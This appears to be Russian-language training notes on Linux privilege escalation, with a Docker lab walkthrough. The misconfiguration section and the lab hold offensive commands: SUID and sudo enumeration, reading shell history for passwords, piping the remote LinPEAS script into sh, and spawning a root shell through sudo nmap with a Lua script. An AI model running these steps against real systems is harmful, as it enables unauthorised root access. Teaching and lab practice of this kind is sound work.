## **Основные понятия**

**DMZ (англ. Demilitarized Zone — демилитаризованная зона, ДМЗ)** — сегмент сети, содержащий общедоступные сервисы и отделяющий их от частных. Цель ДМЗ — добавить дополнительный уровень безопасности в локальной сети, позволяющий  
минимизировать ущерб в случае атаки на один из общедоступных сервисов: внешний злоумышленник имеет прямой доступ только к оборудованию в ДМЗ.

**Повышение привилегий** — это использование различных уязвимостей операционной системы и прикладного программного  
обеспечения для повышения своих полномочий в атакуемой системе.  
  
**Root (от англ. root — корень; читается «рут»), или суперпользователь** — это специальный аккаунт и группа пользователей в UNIX- подобных системах с идентификатором пользователя UID 0 (User IDentifier), владелец которого имеет право на выполнение всех без исключения операций.  
  
**sudo (англ. Substitute User and do, дословно «подменить пользователя и выполнить»)** — программа для системного  
администрирования UNIX-систем, позволяющая делегировать те или иные привилегированные ресурсы пользователям с ведением протокола работы.  
  
**su (сокр. от англ. Substitute User, Set UID, Switch User, Super User — замена пользователя, переключение пользователя,  
суперпользователь)** — команда Unix-подобных операционных систем, позволяющая пользователю войти в систему под другим  
именем, не завершая текущий сеанс.



## Наше положение в сети

После этапа первичных атак мы достигаем своей цели: попадаем на скомпрометированную машину, а именно — в серверный сегмент сети, который с высокой долей вероятности окажется **сетью DMZ.**

Здесь наша основная задача — **получить максимальные привилегии в той информационной системе, в которой мы сейчас находимся.**

Для того, чтобы выбраться из этого сегмента и попасть в основные сегменты сети, нам необходимо получить **возможность действовать эффективно и удобно из текущей точки сети,** т.е.:

- получить максимальные привилегии на скомпрометированном узле;
- закрепиться на этом узле;
- пробросить свой сетевой доступ дальше по сети.




## Общие принципы

**Цели повышения привилегий:**

- Получение произвольного доступа ко всем хранящимся в системе данным
- Использование возможностей системы, недоступных для обычного пользователя
- Модификация работающего в системе программного обеспечения для сбора дополнительной информации
- Сокрытие следов активности от системного администратора
- Обеспечение условий для атаки на гипервизор

### **Методы повышения привилегий**

**Использование физического доступа**

Например, когда вы получаете совершенно простой доступ на уровне вытаскивания диска или изменения пароля через загрузчик grub.

**Использование ошибок администрирования**

Это те ошибки, которые возникают из-за недочетов администраторов, а не из-за ошибок в конкретном ПО, установленном в ОС

**Эксплуатация логических бинарных уязвимостей привилегированных сервисов**

Такие ситуации возможны, когда мы обнаружили уязвимость в установленном ПО, работающем под высокими привилегиями.

**Атаки на ядро Linux**

Большинство атак на ядро Linux связаны с повреждением его памяти.

В этом уровне мы рассмотрим наиболее часто используемый и легко осваиваемый метод повышения привилегий: **использование ошибок администрирования.**

## Эксплуатация ошибок администрирования ОС Linux

Мы подробно разберём **технику** **использования ошибок администрирования ОС Linux,** так как:

- Это один из самых простых и частых способов повышения привилегий в Linux
- Важно, чтобы вы сами не допускали подобных ошибок при администрировании своей инфраструктуры
### **Механизмы безопасности и разграничения прав доступа**

Для лучшего понимания проблем безопасности, возникающих в ОС Linux, мы познакомимся с некоторыми базовыми технологиями безопасности в ОС:

- Как устроено управление пользователями и группами
- Как происходит управления правами доступа к файлам
- Какие есть встроенные механизмы передачи и получения прав доступа
### **Как устроено управление пользователями и группами**

Обычные пользователи (их UID начинается с 500 или 1000, в зависимости от дистрибутива) ограничены в правах и с настройками по умолчанию не могут нанести серьезный вред целостности системы.  
  
`/etc/passwd`  — текстовый файл, содержащий список учетных записей пользователей. В него можно добавить своего пользователя с отличным от root именем, но с тем же UID:

![[Pasted image 20240609184617.png]]

### **Какие есть встроенные механизмы передачи и получения прав доступа**


**Специальные права: SUID**

_SUID bit_ позволяет выполнение программы с правами хозяина файлов. Это — ключевой механизм повышения прав в Unix-  
системах. Основная идея — **дать пользователям как можно меньше прав, при этом достаточных для решения поставленных задач.** Механизм используется в большинстве UNIX и UNIX-подобных операционных системах.  
**Особенности механизма SUID** в стандартных конфигурациях Linux:

- Работают с полномочиями пользователя root
- Используются для выполнения безопасных привилегированных операций, например, смены пароля или отправки ICMP-запросов
- Используются для штатной смены идентификаторов пользователя: _su, sudo, pkexec_
- Требования к качеству кода этих программ довольно высокие, т.к. ошибки в них могут привести к нарушению безопасности всей системы
- Программы учитывают идентификатор запустившего их пользователя и различные файлы конфигурации

**Команда sudo**

Правила, используемые _sudo_ для принятия решения о предоставлении доступа, находятся в файле `/etc/sudoers`. Для  
редактирования файла можно использовать специальный редактор _visudo_, запускаемый из командной строки без параметров, в том числе без указания пути к файлу.

> Язык написания и примеры использования подробно изложены в `man sudoers`

**Команда su**

Для использования _su_ необходимо ввести соответствующий пароль (если только команду не вызывает пользователь root).  
Если введён правильный пароль, _su_ создает новый процесс командного интерпретатора с такими же реальными и эффективными идентификаторами пользователя и группы, а также списком дополнительных групп, что и у указанного пользователя.

## **Ошибки, допускаемые в конфигурации механизмов безопасности**

**Хранение «отладочных» файлов с suid-битом**

- Поиск таких файлов: `find / -perm /4000`

**Предоставление доступа к команде _sudo_ на файлы, дающие возможность выполнить произвольный код:**

- Изучение предоставленных возможностей sudo_:_ `sudo -l`

**Ошибки администрирования и ввода паролей при применении команды sudo**  
  
Зачастую администраторы ошибаются: в спешке используют команду _sudo_, и, не выполнив команду _sudo_, продолжают вводить пароль, остающийся в истории команд.

> Изучение истории команд пользователя: `cat ~/.bash_history`

**Ошибки конфигурации демона Cron, отвечающего за периодизацию выполнения задач**  
  
Если строка задания написана в Cron некорректно, у злоумышленника появляется возможность воспользоваться такой ошибкой и выполнить произвольный код через перезапись файлов и добавление исполняемых файлов.

> Посмотреть список задач в Cron: `cat /etc/crontab`



## Практика

1. Запускаем докер с образом linux

```bash
~ ❯ cd docker  
~/docker ❯ cd lpe-prod 
~/docker/lpe-prod ❯ ls                                       
docker-compose.yaml  Dockerfile-machine  script.sh
~/docker/lpe-prod ❯ docker compose up -d
WARN[0000] /home/nl/docker/lpe-prod/docker-compose.yaml: `version` is obsolete 
[+] Running 1/0
 ✔ Container lpe-prod-machine-1  Running                                       0.0s 
~/docker/lpe-prod ❯ 
```

![[Pasted image 20240609200859.png]]
2. Проверим права текущего пользователя:

`$ id`

3. Отмечаем, что текущий пользователь входит в группу sudo и, следовательно, может выполнять различные команды с повышенными привилегиями. Получаем список таких команд:

`$ sudo -l`

4. Видим, что мы можем запускать утилиту nmap, не вводя пароль; проверим, что права действительно повышаются, использовав опцию сканирования -sS, доступную только для root:

`$ sudo nmap -sS localhost`

5. Для более полного поиска векторов для повышения прав воспользуемся утилитой LinPEAS:

[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Скачаем и выполним этот скрипт, проанализируем его вывод:

`$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

6.  Для поиска способов выполнить произвольного кода с помощью утилиты с повышенными привилегиями обратимся к ресурсу [https://gtfobins.github.io/](https://gtfobins.github.io/) и найдем там nmap. Чтобы получить интерактивный шелл с правами root, воспользуемся командами с ресурса gtfobins и заставим nmap выполнить Lua-скрипт, открывающий командную оболочку:

> _Создадим временный файл с кодом скрипта и сохраним его имя в переменную TF:_
> 
> `$ TF=$(mktemp)`
> 
> Добавим код, открывающий оболочку sh:
> 
> `$ echo 'os.execute("/bin/sh")' > $TF`

6. Запустим скрипт от имени root с помощью sudo и nmap:

`$ sudo nmap --script=$TF`

7. Проверяем полученные права:

`$ id`


